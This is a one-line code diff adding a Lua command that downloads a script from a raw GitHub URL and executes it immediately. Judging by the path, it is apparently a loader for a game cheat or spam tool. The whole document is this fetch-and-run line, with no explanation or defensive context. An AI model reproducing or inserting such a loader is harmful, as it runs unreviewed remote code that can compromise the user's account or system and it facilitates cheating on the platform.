@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/event-sniper-arena-spam4-yr9gyrl3o7qksi.lua"))()
